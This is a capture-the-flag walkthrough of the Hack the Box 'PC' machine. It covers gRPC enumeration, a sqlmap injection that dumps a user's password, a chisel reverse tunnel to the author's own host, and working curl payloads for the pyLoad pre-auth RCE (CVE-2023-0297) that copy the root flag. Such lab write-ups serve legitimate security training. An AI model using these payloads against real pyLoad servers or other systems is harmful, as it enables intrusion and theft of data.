+++
author = "Nick"
categories = ["hack the box", "Easy", "Linux"]
date = 2023-04-29T11:00:00.000Z
publishDate = 2023-04-29T11:00:00.000Z
description = " "
summary = ""
draft = false
slug = "hack-the-box-pc"
tags = ["hack the box", "Easy", "Linux", "grpc", "SQL Injection", "RCE", "pyload", "grpcui", "grpcurl"]
title = "Hack the Box - PC"
url = "/hack-the-box-pc"
thumbnail = "/images/pc/logo.png"
+++

Welcome back! Today we are going to be doing the Hack the Box machine - PC. This is listed as an easy Linux machine. Let's get started!

As usual, we start with a `rustscan` of the target, here are the results:


```
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93SVN%I=7%D=8/17%Time=64DE285C%P=x86_64-unknown-linux
SF:-gnu%r(NULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\
SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r
SF:(GenericLines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xf
SF:f\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")
SF:%r(GetRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xf
SF:f\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")
SF:%r(HTTPOptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(RTSPRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(RPCCheck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xf
SF:f\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")
SF:%r(DNSVersionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff
SF:\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\
SF:0\0\0\?\0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x0
SF:4\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x
SF:04\x08\0\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0
SF:\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\
SF:0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x
SF:04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\
SF:x04\x08\0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x
SF:04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\
SF:x04\x08\0\0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Well, this is a much more interesting result than usual. So poking around the port and doing some research on it, leads us to a `gRPC Service`. So, we [download `gprcurl`](https://github.com/fullstorydev/grpcurl). Now we need to get some information about the service. We can issue `./grpcurl -plaintext 10.129.229.30:50051 describe`.

![](/images/pc/pc1.png)

Now we can see what services are available to us. So right off the bat we try to use `.getInfo` but are told we need to authorize.

![](/images/pc/pc2.png)

So, we register a user with the supplied `.RegisterUser` method. We send it blank to see what it expects.

![](/images/pc/pc3.png)

We know it expect `json` most likely in a `user:password` format. Attempting just that we are told, we need to supply a strong password again. Implying that `username` and `password` are they're own entries.

![](/images/pc/pc4.png)

We are able to register an account with `/grpcurl -plaintext -d '{"username": "test", "password": "test"}' 10.129.229.30:50051 SimpleApp.RegisterUser`. Next we need to use the `.LogIn` method: `./grpcurl -plaintext -d '{"username": "test", "password": "test"}' 10.129.229.30:50051 SimpleApp.LoginUser`.

![](/images/pc/pc5.png)

We see we get back an `id` as well as a `token`. Now at this point I wasn't able to make more headway using `grpcurl`. I continued to look for additional resources, this is when I switched over to `[grpcui](https://github.com/fullstorydev/grpcui)`. I was able to navigate the options much better using this tooling. To install this you need to install `golang` then install the module via `go` - `go install github.com/fullstorydev/grpcui/cmd/grpcui@latest`. You can then find the compiled binary in `~/kali/go/bin`. Once that's all done you have a nice interface into the `gRPC` interface.

![](/images/pc/pc6.png)

Now with this installed, I created a new user and sent the `token` plus `id` to the server. The response was... boring.

![](/images/pc/pc7.png)

Well, we've used all the methods here with nothing standing out. Time to dig a bit further into what's within this request stack. We load the `grpcui` page into `burpsuite` and re-create all the requests. Re-inspecting the requests let's us send them to `repeater` for better tampering. The `.getInfo` request is ideally the starting point due to the `id` field. Often this can be a good `IDOR` indicator. So, we change the `id` field to `0` then `1` and we get two interesting responses.

![](/images/pc/pc8.png)
![](/images/pc/pc9.png)

The second request - `id:1` - seems a little bit suspect, quite possibly a vulnerable entry. Some basic `SQL Injections` give the same response. So instead of hand testing this field, we can feed it over to `sqlmap`. We make a `req.txt` file with our `HTTP` request in it. We then load it into `sqlmap` with the `-r` command.

`sqlmap -r req.txt --batch -a --dump-all`

In this case, `--dump-all` is sorta lazy but it works for this scenario. It runs and finds us a `username` and `password`.

![](/images/pc/pc10.png)

Now we have `sau:HereIsYourPassWord1431`, let's try to `ssh` with these credentials. It works and we're in! We snag the `user.txt` flag and start enumerating internally.

![](/images/pc/user.png)

We copy over `linpeas` and `pspy` and see what they find. While those run we poke around manually to see what might be available to us. One of the first things that comes back is that there is something running on port `8000`. When we `curl` it we see that it redirects to a login page. So we copy over `chisel` and set up our `server` and `client`

Our machine: `./chisel server --reverse --port 7070`
Compromised machine: `./chisel client 10.10.14.2:7070 R:8000:127.0.0.1:8000`

Now, when we check `127.0.0.1:8000` locally, we see `pyLoad` page being displayed.\

![](/images/pc/pc11.png)

Tried the `sau` password, no dice. Tried some basic `admin` and the default of `pyload`:`pyload`. Doing some more digging we see that there is a `[Pre-Auth RCE](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)` in the software. So we test the `PoC` provided out.

Command:
```
/var/opt$ curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
```

![](/images/pc/pc12.png)

Sure enough, it worked.

So in this case, we'll craft a simple command to copy over the `root.txt` file to `/tmp` then we'll `chown` it and we should have our flag!

Command:
`curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"cp%20/root/root.txt%20/tmp/r.txt\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://127.0.0.1:8000/flash/addcrypted2'`

![](/images/pc/pc13.png)

Command:
`curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"chown%20sau%20/tmp/r.txt\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://127.0.0.1:8000/flash/addcrypted2'`

![](/images/pc/pc14.png)

Now we can simply `cat` `r.txt` and get our `root.txt` flag!

![](/images/pc/pc15.png)

I you could also do something like spawning a reverse shell or maybe even `suid` bit on `bash` but this was easier and faster :D. Another one bites the dust!
